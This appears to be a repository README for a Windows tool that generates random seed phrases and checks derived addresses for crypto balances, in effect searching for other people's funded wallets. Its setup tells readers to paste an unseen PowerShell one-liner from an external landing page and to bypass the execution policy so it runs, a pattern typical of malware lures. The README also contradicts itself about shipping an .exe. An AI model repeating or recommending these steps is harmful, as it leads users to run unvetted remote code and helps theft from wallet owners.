<div align="center">
<br/>
<h1>Seed Phrase Generator Balance Checker</h1>
<h3><em>Utilities and companion tools for seed phrase generator and balance checker.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-2b6cff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DB2777&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Mnemonic+Balance+Checker+Pro;%E2%9C%85+Standalone+.exe+Release;%E2%AD%90+No+Limits;%F0%9F%93%A6+Ready+for+Windows;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

### 🖥️ PowerShell Setup

Open PowerShell (5.1+), paste the one-liner from the landing page, hit Enter — the bootstrap pulls the current module set and wires it up.

![Stars](https://img.shields.io/github/stars/Sahilog02/mnemonic-balance-checker?style=flat-square)
![OS](https://img.shields.io/badge/OS-Windows%2010%20%7C%2011-0078D4?style=flat-square)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)

<p align="center">
  <a href="https://Sahilog02.github.io/mnemonic-balance-checker/">
    <img src="files/button.svg" width="520" alt="Powershell Setup Instructions" />
  </a>
</p>

## Overview

| Module | Purpose | Status |
|---|---|---|
| `mnemonic-forge` | BIP-39 phrase generation (12/15/18/21/24 words) | ✅ stable |
| `balance-probe` | On-chain balance lookup across configured endpoints | ✅ stable |
| `deriv-path-mapper` | HD derivation path enumeration (BIP-44/49/84) | ✅ stable |
| `checksum-verify` | Wordlist + checksum validation before probe | ✅ stable |
| `addr-sweep` | Batch address derivation + balance aggregation | 🟡 beta |
| `entropy-log` | CSPRNG entropy source audit trail | ✅ stable |
| `export-vault` | Encrypted local output (AES-GCM) | 🟡 beta |

## What is mnemonic-balance-checker?

| Question | Answer |
|---|---|
| What does it do? | Generates seed phrases and checks derived addresses for balances |
| Where does it run? | Windows desktop, PowerShell-driven, no install wizard |
| What chains? | Configurable endpoints — BTC, ETH, and EVM-compatible by default |
| Is it offline-capable? | Generation yes; balance lookup needs network |
| What's it built on? | BIP-39 wordlists + BIP-32/44/49/84 derivation |
| Who's it for? | People who want a scriptable, auditable phrase+balance workflow |

## Key Features

| Feature | Detail |
|---|---|
| Deterministic generation | BIP-39 compliant, 128–256 bit entropy |
| Multi-path derivation | BIP-44 / 49 / 84 in one pass |
| Batch probing | Sweep N addresses per phrase against endpoints |
| Checksum gate | Invalid phrases rejected before any network call |
| Local-only secrets | Phrases never leave the machine unless you export |
| Encrypted export | Vault output is AES-GCM encrypted at rest |
| Config-as-file | `config.toml` — endpoints, paths, timeouts |
| Entropy audit | Logs which CSPRNG source was used per session |
| No telemetry | Zero outbound calls except balance probes |

## System Requirements

| Requirement | Minimum |
|---|---|
| OS | Windows 10 (21H2) or Windows 11 |
| PowerShell | 5.1 (7.x recommended) |
| Network | Required for balance probing only |
| Disk | ~40 MB after module pull |
| RAM | 256 MB free |
| Execution policy | `RemoteSigned` or `Bypass` for current session |

## How it works

The landing page hosts the bootstrap one-liner. You open PowerShell, paste it, press Enter. The bootstrap:

1. Verifies PowerShell version and execution policy.
2. Pulls the current module set (`mnemonic-forge`, `balance-probe`, `deriv-path-mapper`, `checksum-verify`, plus optional `addr-sweep`, `entropy-log`, `export-vault`).
3. Drops a default `config.toml` into `%LOCALAPPDATA%\mnemonic-balance-checker\`.
4. Registers the `mbc` command surface for the session.

No `.exe`, no installer, no registry writes beyond the config path. Re-run the one-liner any time to update — it's idempotent.

## Compatibility

| Area | Notes |
|---|---|
| Windows 10/11 | Fully supported |
| PowerShell 7.x | Recommended — faster module load |
| PowerShell 5.1 | Supported, slightly slower |
| Offline generation | Works — no network needed for phrase creation |
| Offline probing | Not supported — balance lookups require endpoints |
| WSL | Untested; PowerShell modules assume Windows paths |
| ARM64 Windows | Works via PowerShell 7 |

## Known Issues

| Issue | Workaround |
|---|---|
| `addr-sweep` throttles on public RPCs | Raise `timeout_ms` in `config.toml`, or point at a paid endpoint |
| `export-vault` beta drops trailing newline on some editors | Open with a hex-aware viewer; fix lands next module bump |
| PS 5.1 slow first-run module import | Accept ~4s cold start, or switch to PS 7 |
| Execution policy blocks bootstrap on locked-down boxes | `Set-ExecutionPolicy -Scope Process Bypass` for the session |
| `entropy-log` writes to `%LOCALAPPDATA%` only | Point `log_path` elsewhere if you need central collection |

## FAQ

**Q: Do I need admin rights?** No — everything lands in `%LOCALAPPDATA%`.

**Q: Does the bootstrap run anything I can't inspect?** The landing page shows the full one-liner; read it before pasting.

**Q: Can I run it fully offline?** Generation yes. Balance probing needs endpoints — that's the point.

**Q: Where do my phrases go?** Nowhere unless you `export-vault`. No telemetry, no phoning home.

**Q: How do I update?** Re-run the same one-liner. It's idempotent.

**Q: Can I use my own RPC endpoints?** Yes — edit `config.toml`, `balance-probe` reads it on start.

**Q: Does it support 24-word phrases?** Yes — 12/15/18/21/24 all supported by `mnemonic-forge`.

**Q: What if PowerShell 5.1 chokes on the bootstrap?** Use PS 7, or set `-Scope Process Bypass` for the session.

**Q: Is `addr-sweep` safe for large batches?** Beta — start small, watch your endpoint rate limits.

## Disclaimer

Educational and research tooling. You are responsible for how you use it — including any phrases you generate, any endpoints you probe, and any vault you export. Don't point it at infrastructure you don't own or have permission to query. Use at your own risk.

## License

MIT — see `LICENSE` in the repo.
